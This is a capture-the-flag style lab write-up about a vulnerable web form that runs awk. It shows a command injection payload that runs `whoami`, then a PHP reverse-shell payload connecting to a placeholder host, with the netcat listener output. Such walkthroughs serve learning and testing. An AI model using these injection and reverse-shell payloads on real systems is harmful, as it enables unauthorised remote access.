# Challange

### Website Interface:

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/bb4495ee-93e9-4730-be34-f344f9777c03)

- When entering values in the input boxes, a corresponding output is generated. 

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/b8658bac-bd72-4975-b28e-cb6ac6e81185)

- Upon inspecting the source code, I discovered certain elements or information.

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/4319fd1c-00db-41f2-a3c7-62d0a371177f)

- It appears that I can potentially use the output.
- By entering the "random" value or input, I encountered a specific response or behavior.

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/75c1dc58-2d71-4c9b-a2b2-412c204c387f)

```html
<div class="p-5 mb-4 bg-light rounded-3" style="background-color: none !important; padding: 0 !important">
		            <p class="text-center">Executed: awk 'BEGIN {print sqrt(((-123)^2) + ((-789)^2))}'<br>Result: 798.53
</p>
		        </div>
```
- After attempting various options, one of them eventually proved successful in achieving the desired outcome.
- After modifying the "cmd" and injecting the `whoami` command, the system responded with the output displaying the username that is www-data.

- cmd: `789)^2))}';whoami;#`

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/a8a3314e-a231-4d18-815b-7b6d8ad44027)

```html
		<div class="p-5 mb-4 bg-light rounded-3" style="background-color: none !important; padding: 0 !important">
		            <p class="text-center">Executed: awk 'BEGIN {print sqrt(((-123)^2) + ((-789)^2))}';whoami;#)^2))}'<br>Result: 798.53
www-data
</p>
```
- After experimenting with different payloads, you successfully landed on a PHP reverse shell, allowing you to regain a shell connection to the system.
- cmd: `789)^2))}';php -r '$sock=fsockopen("<LHOST>",1234);exec("/bin/sh -i <&3 >&3 2>&3");';#`

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/ebd2fff6-6ff7-4a57-b4a4-0a9a676aaed9)

```bash
└─$ rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.251.186] from (UNKNOWN) [172.18.0.4] 50032
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```
